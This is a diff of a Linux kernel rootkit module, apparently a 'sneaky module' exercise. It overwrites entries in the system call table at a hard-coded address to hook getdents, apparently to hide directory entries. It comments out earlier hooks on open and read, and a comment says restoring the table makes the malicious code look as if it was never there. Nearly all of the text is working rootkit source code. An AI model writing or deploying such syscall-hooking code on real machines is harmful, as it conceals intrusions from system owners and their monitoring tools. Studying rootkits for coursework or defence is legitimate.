@@ -63,19 +63,19 @@ static unsigned long *sys_call_table = (unsigned long*)0xffffffff81e001a0;
 //This is used for all system calls.
 
 
-asmlinkage int (*original_read)(int fd, void * buf, size_t count); //for read syscall
-asmlinkage int (*original_open)(const char *pathname, int flags); //for open syscall
+//asmlinkage int (*original_read)(int fd, void * buf, size_t count); //for read syscall
+//asmlinkage int (*original_open)(const char *pathname, int flags); //for open syscall
 asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count); //for getdents syscall
 
 
 
 
 //Define our new sneaky version of the 'open' syscall
-asmlinkage int sneaky_sys_open(const char *pathname, int flags)
+/*asmlinkage int sneaky_sys_open(const char *pathname, int flags)
 {
   printk(KERN_INFO "Very, very Sneaky!\n");
   return original_open(pathname, flags);
-}
+}*/
 
 
 //Define our new sneky version of the 'getdents' syscall
@@ -118,7 +118,6 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, u
 
 //Define our new sneaky_version of the 'read' syscall
 asmlinkage int sneaky_sys_read(int fd, void * buf, size_t count){
-
   return 0;
 }
 
@@ -147,12 +146,12 @@ static int initialize_sneaky_module(void)
   *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
  
   //for open
-  original_open = (void*)*(sys_call_table + __NR_open);
-  *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
+  // original_open = (void*)*(sys_call_table + __NR_open);
+  //*(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
 
   //for read
-  original_read = (void*)*(sys_call_table + __NR_read);
-  *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
+  //original_read = (void*)*(sys_call_table + __NR_read);
+  //*(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
 
    
   //Revert page to read-only
@@ -182,9 +181,9 @@ static void exit_sneaky_module(void)
   //This is more magic! Restore the original 'open' system call
   //function address. Will look like malicious code was never there!
   
-  *(sys_call_table + __NR_open) = (unsigned long)original_open;
-  *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
-  *(sys_call_table + __NR_read) = (unsigned long)original_read;
+  //*(sys_call_table + __NR_open) = (unsigned long)original_open;
+   *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
+  //*(sys_call_table + __NR_read) = (unsigned long)original_read;
 
   //Revert page to read-only
   pages_ro(page_ptr, 1);
